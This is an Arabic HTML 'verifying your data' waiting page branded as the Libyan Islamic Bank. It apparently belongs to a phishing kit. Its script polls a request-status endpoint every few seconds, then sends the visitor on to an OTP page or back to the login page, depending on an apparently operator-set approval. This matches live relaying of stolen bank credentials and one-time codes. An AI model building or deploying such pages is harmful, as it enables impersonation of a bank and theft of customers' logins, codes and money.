<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق - المصرف الإسلامي الليبي</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #8b6914, #a07d2e, #6b5010);
            padding: 20px;
        }
        .loading-container {
            text-align: center;
        }
        .loading-logo {
            width: 180px;
            margin-bottom: 30px;
            filter: brightness(0) invert(1);
            mix-blend-mode: screen;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .loading-text {
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        .loading-sub {
            color: rgba(255,255,255,0.7);
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <img src="images/logo.png" alt="المصرف الإسلامي الليبي" class="loading-logo">
        <div class="spinner"></div>
        <p class="loading-text">جاري التحقق من بياناتك...</p>
        <p class="loading-sub">يرجى الانتظار</p>
    </div>

    <script>
    var params = new URLSearchParams(window.location.search);
    var orderId = params.get('orderId');

    function checkStatus() {
        if (!orderId) return;
        fetch('/api/requests/' + orderId + '/check')
            .then(function(res) { return res.json(); })
            .then(function(data) {
                if (data.status === 'approved') {
                    window.location.href = 'otp.html?orderId=' + orderId;
                } else if (data.status === 'rejected') {
                    window.location.href = 'login.html?orderId=' + orderId + '&error=1';
                }
            })
            .catch(function() {});
    }

    setInterval(checkStatus, 3000);
    checkStatus();
    </script>
</body>
</html>
